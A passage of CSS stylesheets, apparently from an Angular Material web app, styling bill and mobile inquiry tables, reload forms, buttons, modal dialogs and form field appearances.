    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel[_ngcontent-c2]:not([class*=mat-elevation-z]) {
        border: none;
        border-top: 1px solid rgba(40, 51, 65, .1);
        border-radius: 0
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel[_ngcontent-c2]:last-child:not([class*=mat-elevation-z]) {
        border-bottom: 1px solid rgba(40, 51, 65, .1)
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2] {
        border-collapse: inherit;
        border-spacing: 0 15px;
        margin-bottom: 20px
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2],
    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2],
    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2] {
        border: none
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2] {
        color: rgba(92, 89, 109, .9);
        font-weight: 300;
        font-size: 13px !important;
        padding-bottom: 0;
        padding-top: 0
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2] {
        border-bottom: 1px solid #dee2e6;
        line-height: 34px;
        position: relative;
        border-left: none;
        border-right: none;
        color: #586473
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2]>tr[_ngcontent-c2]>th[_ngcontent-c2]:first-child {
        padding-left: 40px !important
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2] .mat-radio-label[_ngcontent-c2] {
        margin-bottom: 0
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:after {
        content: '';
        width: 1px;
        background: #dee2e6;
        top: 15px;
        bottom: 15px;
        left: -1px;
        position: absolute
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:first-child:after,
    .table-prepaid-order-activation-list[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:last-child::after {
        display: none
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px;
        border-left: 1px solid #dee2e6
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px;
        border-left: none;
        border-right: 1px solid #dee2e6;
        min-width: 95px
    }

    .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-last-child(2) {
        border-right: none
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel-spacing[_ngcontent-c2] {
        margin: 0
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel-header[_ngcontent-c2]:after {
        content: '+';
        position: absolute;
        top: 20px;
        right: 20px;
        font-size: 20px;
        font-weight: 700
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel-header.mat-expanded[_ngcontent-c2]:after {
        content: '--';
        letter-spacing: -1px
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-indicator[_ngcontent-c2]::after {
        position: relative;
        border: none
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-expansion-panel[_ngcontent-c2]:last-child {
        margin-bottom: 40px !important
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mat-radio-outer-circle[_ngcontent-c2] {
        border-color: #919eba !important;
        border-width: 1px
    }

    .mobilecategoryinquiry[_ngcontent-c2] .mobilecategoryinquiry-mobil[_ngcontent-c2] {
        display: none
    }

    @media only screen and (max-width:569px) {
        .mobilecategoryinquiry[_ngcontent-c2] .mat-radio-container[_ngcontent-c2] {
            margin-left: -40px;
            margin-right: 10px;
            top: -15px
        }

        .mobilecategoryinquiry[_ngcontent-c2] .mobilecategoryinquiry-mobil[_ngcontent-c2] {
            display: block
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>thead[_ngcontent-c2] {
            display: none
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2] {
            display: block;
            padding-left: 60px;
            line-height: 24px;
            color: #586473;
            min-width: 200px;
            border-left: 1px solid #dee2e6;
            border-right: 1px solid #dee2e6;
            border-bottom: 0;
            border-top: 0
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-last-child(2) {
            border-right: 1px solid #dee2e6
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-last-child(2),
        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-last-child(3),
        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-last-child(4) {
            display: none
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:first-child {
            border-top-right-radius: 4px;
            border-top: 1px solid #dee2e6
        }

        .mobilecategoryinquiry[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:last-child {
            border-bottom-left-radius: 4px;
            border-left: 1px solid #dee2e6;
            border-bottom: 1px solid #dee2e6
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]:nth-child(1)>td[_ngcontent-c2] {
            border-bottom: none
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]:nth-child(2)>td[_ngcontent-c2] {
            border-top: none
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]:nth-child(2)>td[_ngcontent-c2]>div[_ngcontent-c2]:first {
            border-top: 1px solid #dee2e6
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr[_ngcontent-c2]>td[_ngcontent-c2]:nth-child(2)>div[_ngcontent-c2] {
            display: none
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr.mobil[_ngcontent-c2] {
            display: table-row
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr.mobil[_ngcontent-c2]>td[_ngcontent-c2] {
            padding-top: 0
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr.mobil[_ngcontent-c2]>td[_ngcontent-c2]>div[_ngcontent-c2] {
            text-align: left
        }

        .billinquerytable[_ngcontent-c2] table[_ngcontent-c2]>tbody[_ngcontent-c2]>tr.mobil[_ngcontent-c2]>td[_ngcontent-c2]>div[_ngcontent-c2]:nth-child(1) {
            border-top: 1px solid #dee2e6;
            padding-top: 10px
        }

        .billinquerytable[_ngcontent-c2] .bill-checkbox[_ngcontent-c2] {
            width: 40px;
            text-align: left
        }
    }

    @media only screen and (max-width:321px) {
        .ibmToolTip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] {
            line-height: 15px !important;
            font-family: Muli !important;
            max-width: 318px !important;
            width: 318px !important;
            margin-right: 279px !important
        }

        .ibmToolTip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2] .container-toolTip[_ngcontent-c2],
        .ibmToolTip[_ngcontent-c2] .tooltip-inner[_ngcontent-c2]>.container-toolTip[_ngcontent-c2] {
            width: 287px !important
        }
    }

    .mat-checkbox-ripple {
        display: none !important
    }

    .bill-checkbox[_ngcontent-c2] .checkbox.mat-checkbox[_ngcontent-c2] .mat-checkbox-ripple[_ngcontent-c2],
    .checkbox-group[_ngcontent-c2] .checkbox.mat-checkbox[_ngcontent-c2] .mat-checkbox-ripple[_ngcontent-c2] {
        display: none !important
    }

    .reload-form-input[_ngcontent-c2] .mat-form-field[_ngcontent-c2] {
        width: calc(100% - 150px);
        display: inline-block !important;
        float: left
    }

    .reload-form-input[_ngcontent-c2] .mat-form-field[_ngcontent-c2] .mat-form-field-wrapper[_ngcontent-c2] .mat-form-field-flex[_ngcontent-c2] {
        border-radius: 4px 0 0 !important
    }

    .reload-form-input[_ngcontent-c2] {
        display: inline-block;
        width: 100%
    }

    .reload-form-input[_ngcontent-c2] button[_ngcontent-c2] {
        width: 150px;
        border: 1px solid #dee3ed;
        display: inline-block;
        border-radius: 0 4px 4px 0;
        height: 53.5px;
        float: left;
        margin-bottom: 15px;
        color: #049ead
    }

    .reload-form-input[_ngcontent-c2] .cdk-focused[_ngcontent-c2],
    .reload-form-input[_ngcontent-c2] .cdk-mouse-focused[_ngcontent-c2],
    .reload-form-input[_ngcontent-c2] button[_ngcontent-c2]:focus,
    .reload-form-input[_ngcontent-c2] button[_ngcontent-c2]:hover {
        border: 1px solid #dee3ed !important;
        outline: 0 !important
    }

    .mat-icon-button[_ngcontent-c2] .mat-button-focus-overlay[_ngcontent-c2],
    .reload-form-input[_ngcontent-c2] .mat-button[_ngcontent-c2] .mat-button-focus-overlay[_ngcontent-c2] {
        display: none
    }
</style>
<style>
    .tlpackages[_ngcontent-c3] .mat-stroked-button {
        margin: 0 9px 20px 15px !important;
        border-radius: 4px !important;
        overflow: visible !important;
        border: 1px solid #dee2e6 !important;
        background: #fff;
        line-height: 46px;
        min-width: 52px
    }
    
    .tlpackages[_ngcontent-c3] .btn-group,
    .tlpackages[_ngcontent-c3] .btn-group-vertical {
        display: inline-block
    }
</style>
<style>
    .mat-button,
    .mat-flat-button,
    .mat-icon-button,
    .mat-stroked-button {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: 0;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 88px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 2px;
        overflow: visible
    }

    .mat-button::-moz-focus-inner,
    .mat-flat-button::-moz-focus-inner,
    .mat-icon-button::-moz-focus-inner,
    .mat-stroked-button::-moz-focus-inner {
        border: 0
    }

    .mat-button[disabled],
    .mat-flat-button[disabled],
    .mat-icon-button[disabled],
    .mat-stroked-button[disabled] {
        cursor: default
    }

    .mat-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-flat-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-icon-button.cdk-program-focused .mat-button-focus-overlay,
    .mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-stroked-button.cdk-program-focused .mat-button-focus-overlay {
        opacity: 1
    }

    .mat-button::-moz-focus-inner,
    .mat-flat-button::-moz-focus-inner,
    .mat-icon-button::-moz-focus-inner,
    .mat-stroked-button::-moz-focus-inner {
        border: 0
    }

    .mat-button .mat-button-focus-overlay,
    .mat-icon-button .mat-button-focus-overlay {
        opacity: 0
    }

    .mat-button:hover .mat-button-focus-overlay,
    .mat-stroked-button:hover .mat-button-focus-overlay {
        opacity: 1
    }

    @media (hover:none) {

        .mat-button:hover .mat-button-focus-overlay,
        .mat-stroked-button:hover .mat-button-focus-overlay {
            opacity: 0
        }
    }

    .mat-raised-button {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: 0;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 88px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 2px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1)
    }

    .mat-raised-button::-moz-focus-inner {
        border: 0
    }

    .mat-raised-button[disabled] {
        cursor: default
    }

    .mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-raised-button.cdk-program-focused .mat-button-focus-overlay {
        opacity: 1
    }

    .mat-raised-button::-moz-focus-inner {
        border: 0
    }

    .mat-raised-button:not([class*=mat-elevation-z]) {
        box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
    }

    ._mat-animation-noopable.mat-raised-button {
        transition: none;
        animation: none
    }

    .mat-raised-button:not([disabled]):active:not([class*=mat-elevation-z]) {
        box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
    }

    .mat-raised-button[disabled] {
        box-shadow: none
    }

    .mat-stroked-button {
        border: 1px solid currentColor;
        padding: 0 15px;
        line-height: 34px
    }

    .mat-stroked-button:not([class*=mat-elevation-z]) {
        box-shadow: 0 0 0 0 rgba(0, 0, 0, .2), 0 0 0 0 rgba(0, 0, 0, .14), 0 0 0 0 rgba(0, 0, 0, .12)
    }

    .mat-flat-button:not([class*=mat-elevation-z]) {
        box-shadow: 0 0 0 0 rgba(0, 0, 0, .2), 0 0 0 0 rgba(0, 0, 0, .14), 0 0 0 0 rgba(0, 0, 0, .12)
    }

    .mat-fab {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: 0;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 88px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 2px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
        min-width: 0;
        border-radius: 50%;
        width: 56px;
        height: 56px;
        padding: 0;
        flex-shrink: 0
    }

    .mat-fab::-moz-focus-inner {
        border: 0
    }

    .mat-fab[disabled] {
        cursor: default
    }

    .mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-fab.cdk-program-focused .mat-button-focus-overlay {
        opacity: 1
    }

    .mat-fab::-moz-focus-inner {
        border: 0
    }

    .mat-fab:not([class*=mat-elevation-z]) {
        box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
    }

    ._mat-animation-noopable.mat-fab {
        transition: none;
        animation: none
    }

    .mat-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
        box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
    }

    .mat-fab[disabled] {
        box-shadow: none
    }

    .mat-fab:not([class*=mat-elevation-z]) {
        box-shadow: 0 3px 5px -1px rgba(0, 0, 0, .2), 0 6px 10px 0 rgba(0, 0, 0, .14), 0 1px 18px 0 rgba(0, 0, 0, .12)
    }

    .mat-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
        box-shadow: 0 7px 8px -4px rgba(0, 0, 0, .2), 0 12px 17px 2px rgba(0, 0, 0, .14), 0 5px 22px 4px rgba(0, 0, 0, .12)
    }

    .mat-fab .mat-button-wrapper {
        padding: 16px 0;
        display: inline-block;
        line-height: 24px
    }

    .mat-mini-fab {
        box-sizing: border-box;
        position: relative;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        cursor: pointer;
        outline: 0;
        border: none;
        -webkit-tap-highlight-color: transparent;
        display: inline-block;
        white-space: nowrap;
        text-decoration: none;
        vertical-align: baseline;
        text-align: center;
        margin: 0;
        min-width: 88px;
        line-height: 36px;
        padding: 0 16px;
        border-radius: 2px;
        overflow: visible;
        transform: translate3d(0, 0, 0);
        transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
        min-width: 0;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        padding: 0;
        flex-shrink: 0
    }

    .mat-mini-fab::-moz-focus-inner {
        border: 0
    }

    .mat-mini-fab[disabled] {
        cursor: default
    }

    .mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,
    .mat-mini-fab.cdk-program-focused .mat-button-focus-overlay {
        opacity: 1
    }

    .mat-mini-fab::-moz-focus-inner {
        border: 0
    }

    .mat-mini-fab:not([class*=mat-elevation-z]) {
        box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12)
    }

    ._mat-animation-noopable.mat-mini-fab {
        transition: none;
        animation: none
    }

    .mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
        box-shadow: 0 5px 5px -3px rgba(0, 0, 0, .2), 0 8px 10px 1px rgba(0, 0, 0, .14), 0 3px 14px 2px rgba(0, 0, 0, .12)
    }

    .mat-mini-fab[disabled] {
        box-shadow: none
    }

    .mat-mini-fab:not([class*=mat-elevation-z]) {
        box-shadow: 0 3px 5px -1px rgba(0, 0, 0, .2), 0 6px 10px 0 rgba(0, 0, 0, .14), 0 1px 18px 0 rgba(0, 0, 0, .12)
    }

    .mat-mini-fab:not([disabled]):active:not([class*=mat-elevation-z]) {
        box-shadow: 0 7px 8px -4px rgba(0, 0, 0, .2), 0 12px 17px 2px rgba(0, 0, 0, .14), 0 5px 22px 4px rgba(0, 0, 0, .12)
    }

    .mat-mini-fab .mat-button-wrapper {
        padding: 8px 0;
        display: inline-block;
        line-height: 24px
    }

    .mat-icon-button {
        padding: 0;
        min-width: 0;
        width: 40px;
        height: 40px;
        flex-shrink: 0;
        line-height: 40px;
        border-radius: 50%
    }

    .mat-icon-button .mat-icon,
    .mat-icon-button i {
        line-height: 24px
    }

    .mat-button-focus-overlay,
    .mat-button-ripple {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        pointer-events: none;
        border-radius: inherit
    }

    .mat-button-focus-overlay {
        background-color: rgba(0, 0, 0, .12);
        border-radius: inherit;
        opacity: 0;
        transition: opacity .2s cubic-bezier(.35, 0, .25, 1), background-color .2s cubic-bezier(.35, 0, .25, 1)
    }

    ._mat-animation-noopable .mat-button-focus-overlay {
        transition: none
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-button-focus-overlay {
            background-color: rgba(255, 255, 255, .5)
        }
    }

    .mat-button-ripple-round {
        border-radius: 50%;
        z-index: 1
    }

    .mat-button .mat-button-wrapper>*,
    .mat-fab .mat-button-wrapper>*,
    .mat-flat-button .mat-button-wrapper>*,
    .mat-icon-button .mat-button-wrapper>*,
    .mat-mini-fab .mat-button-wrapper>*,
    .mat-raised-button .mat-button-wrapper>*,
    .mat-stroked-button .mat-button-wrapper>* {
        vertical-align: middle
    }

    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,
    .mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button {
        display: block;
        font-size: inherit;
        width: 2.5em;
        height: 2.5em
    }

    @media screen and (-ms-high-contrast:active) {

        .mat-button,
        .mat-fab,
        .mat-flat-button,
        .mat-icon-button,
        .mat-mini-fab,
        .mat-raised-button {
            outline: solid 1px
        }
    }
</style>
<style>
    .modal-dialog {
        max-width: 760px !important
    }

    .modal-dialog-centered.modal-conditions .modal-content {
        height: 570px !important
    }

    .modal-content .modal-body {
        min-height: 490px !important
    }

    .modal-content>.modalButton>.close-button:hover {
        outline: 0 !important;
        border: 2px solid rgba(255, 255, 255, .5) !important;
        font-weight: 900 !important
    }

    .modal-content>.modalButton>.close-button:active {
        outline: 0 !important;
        border: 2px solid rgba(255, 255, 255, .5) !important;
        font-weight: 900 !important
    }

    .modal-content ::-webkit-scrollbar {
        width: .7em
    }

    .modal-content ::-webkit-scrollbar-thumb {
        background-color: #dee3ed;
        border-radius: 12px
    }

    .title[_ngcontent-c6] {
        font-weight: 700;
        text-align: center;
        margin-bottom: 20px;
        font-size: 16px !important
    }

    @media only screen and (max-width:569px) {
        .modal-content {
            background: url(assets/img/ibm-icon/modal-icon.html) top center/31% auto no-repeat #049ead
        }

        .modal-content .modal-body {
            width: 100%;
            margin-top: 30%;
            min-height: 250px !important
        }

        .modal-content .modal-footer {
            width: 100%
        }
    }
</style>
<style>
    .mat-form-field {
        display: inline-block;
        position: relative;
        text-align: left
    }

    [dir=rtl] .mat-form-field {
        text-align: right
    }

    .mat-form-field-wrapper {
        position: relative
    }

    .mat-form-field-flex {
        display: inline-flex;
        align-items: baseline;
        box-sizing: border-box;
        width: 100%
    }

    .mat-form-field-prefix,
    .mat-form-field-suffix {
        white-space: nowrap;
        flex: none;
        position: relative
    }

    .mat-form-field-infix {
        display: block;
        position: relative;
        flex: auto;
        min-width: 0;
        width: 180px
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-infix {
            border-image: linear-gradient(transparent, transparent)
        }
    }

    .mat-form-field-label-wrapper {
        position: absolute;
        left: 0;
        box-sizing: content-box;
        width: 100%;
        height: 100%;
        overflow: hidden;
        pointer-events: none
    }

    .mat-form-field-label {
        position: absolute;
        left: 0;
        font: inherit;
        pointer-events: none;
        width: 100%;
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
        transform-origin: 0 0;
        transition: transform .4s cubic-bezier(.25, .8, .25, 1), color .4s cubic-bezier(.25, .8, .25, 1), width .4s cubic-bezier(.25, .8, .25, 1);
        display: none
    }

    [dir=rtl] .mat-form-field-label {
        transform-origin: 100% 0;
        left: auto;
        right: 0
    }

    .mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,
    .mat-form-field-empty.mat-form-field-label {
        display: block
    }

    .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label {
        display: none
    }

    .mat-form-field-can-float .mat-form-field-autofill-control:-webkit-autofill+.mat-form-field-label-wrapper .mat-form-field-label {
        display: block;
        transition: none
    }

    .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
    .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label {
        display: none
    }

    .mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
    .mat-form-field-can-float .mat-input-server[placeholder]:not(:placeholder-shown)+.mat-form-field-label-wrapper .mat-form-field-label {
        display: block
    }

    .mat-form-field-label:not(.mat-form-field-empty) {
        transition: none
    }

    .mat-form-field-underline {
        position: absolute;
        width: 100%;
        pointer-events: none;
        transform: scaleY(1.0001)
    }

    .mat-form-field-ripple {
        position: absolute;
        left: 0;
        width: 100%;
        transform-origin: 50%;
        transform: scaleX(.5);
        opacity: 0;
        transition: background-color .3s cubic-bezier(.55, 0, .55, .2)
    }

    .mat-form-field.mat-focused .mat-form-field-ripple,
    .mat-form-field.mat-form-field-invalid .mat-form-field-ripple {
        opacity: 1;
        transform: scaleX(1);
        transition: transform .3s cubic-bezier(.25, .8, .25, 1), opacity .1s cubic-bezier(.25, .8, .25, 1), background-color .3s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-subscript-wrapper {
        position: absolute;
        box-sizing: border-box;
        width: 100%;
        overflow: hidden
    }

    .mat-form-field-label-wrapper .mat-icon,
    .mat-form-field-subscript-wrapper .mat-icon {
        width: 1em;
        height: 1em;
        font-size: inherit;
        vertical-align: baseline
    }

    .mat-form-field-hint-wrapper {
        display: flex
    }

    .mat-form-field-hint-spacer {
        flex: 1 0 1em
    }

    .mat-error {
        display: block
    }

    .mat-form-field._mat-animation-noopable .mat-form-field-label,
    .mat-form-field._mat-animation-noopable .mat-form-field-ripple {
        transition: none
    }
</style>
<style>
    .mat-form-field-appearance-fill .mat-form-field-flex {
        border-radius: 4px 4px 0 0;
        padding: .75em .75em 0 .75em
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-fill .mat-form-field-flex {
            outline: solid 1px
        }
    }

    .mat-form-field-appearance-fill .mat-form-field-underline::before {
        content: '';
        display: block;
        position: absolute;
        bottom: 0;
        height: 1px;
        width: 100%
    }

    .mat-form-field-appearance-fill .mat-form-field-ripple {
        bottom: 0;
        height: 2px
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-fill .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px
        }
    }

    .mat-form-field-appearance-fill:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
        opacity: 1;
        transform: none;
        transition: opacity .6s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-appearance-fill._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
        transition: none
    }

    .mat-form-field-appearance-fill .mat-form-field-subscript-wrapper {
        padding: 0 1em
    }
</style>
<style>
    .mat-form-field-appearance-legacy .mat-form-field-label {
        transform: perspective(100px);
        -ms-transform: none
    }

    .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon,
    .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon {
        width: 1em
    }

    .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button,
    .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button {
        font: inherit;
        vertical-align: baseline
    }

    .mat-form-field-appearance-legacy .mat-form-field-prefix .mat-icon-button .mat-icon,
    .mat-form-field-appearance-legacy .mat-form-field-suffix .mat-icon-button .mat-icon {
        font-size: inherit
    }

    .mat-form-field-appearance-legacy .mat-form-field-underline {
        height: 1px
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-legacy .mat-form-field-underline {
            height: 0;
            border-top: solid 1px
        }
    }

    .mat-form-field-appearance-legacy .mat-form-field-ripple {
        top: 0;
        height: 2px;
        overflow: hidden
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-legacy .mat-form-field-ripple {
            height: 0;
            border-top: solid 2px
        }
    }

    .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
        background-position: 0;
        background-color: transparent
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-legacy.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px
        }
    }

    .mat-form-field-appearance-legacy.mat-form-field-invalid:not(.mat-focused) .mat-form-field-ripple {
        height: 1px
    }
</style>
<style>
    .mat-form-field-appearance-outline .mat-form-field-wrapper {
        margin: .25em 0
    }

    .mat-form-field-appearance-outline .mat-form-field-flex {
        padding: 0 .75em 0 .75em;
        margin-top: -.25em;
        position: relative
    }

    .mat-form-field-appearance-outline .mat-form-field-prefix,
    .mat-form-field-appearance-outline .mat-form-field-suffix {
        top: .25em
    }

    .mat-form-field-appearance-outline .mat-form-field-outline {
        display: flex;
        position: absolute;
        top: .25em;
        left: 0;
        right: 0;
        bottom: 0;
        pointer-events: none
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-end,
    .mat-form-field-appearance-outline .mat-form-field-outline-start {
        border: 1px solid currentColor;
        min-width: 5px
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-start {
        border-radius: 5px 0 0 5px;
        border-right-style: none
    }

    [dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start {
        border-right-style: solid;
        border-left-style: none;
        border-radius: 0 5px 5px 0
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-end {
        border-radius: 0 5px 5px 0;
        border-left-style: none;
        flex-grow: 1
    }

    [dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end {
        border-left-style: solid;
        border-right-style: none;
        border-radius: 5px 0 0 5px
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-gap {
        border-radius: .000001px;
        border: 1px solid currentColor;
        border-left-style: none;
        border-right-style: none
    }

    .mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap {
        border-top-color: transparent
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-thick {
        opacity: 0
    }

    .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,
    .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap,
